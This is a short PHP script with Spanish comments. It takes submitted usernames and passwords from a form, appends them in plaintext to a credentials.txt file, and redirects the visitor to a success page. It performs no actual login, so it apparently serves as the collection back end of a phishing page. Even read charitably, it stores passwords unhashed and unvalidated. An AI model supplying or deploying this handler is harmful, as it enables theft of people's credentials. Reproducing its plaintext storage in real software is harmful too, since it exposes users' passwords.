<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Obtener las credenciales del formulario
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Aquí puedes agregar la lógica para guardar las credenciales en un archivo o base de datos
    // Por ejemplo, guardarlas en un archivo .txt
    $file = 'credentials.txt';
    $current = file_get_contents($file);
    $current .= "Username: $username, Password: $password\n";
    file_put_contents($file, $current);

    // Redirigir a otra página después de guardar las credenciales
    header('Location: success.html'); // Cambia 'success.php' a la página a la que deseas redirigir
    exit();
}
?>
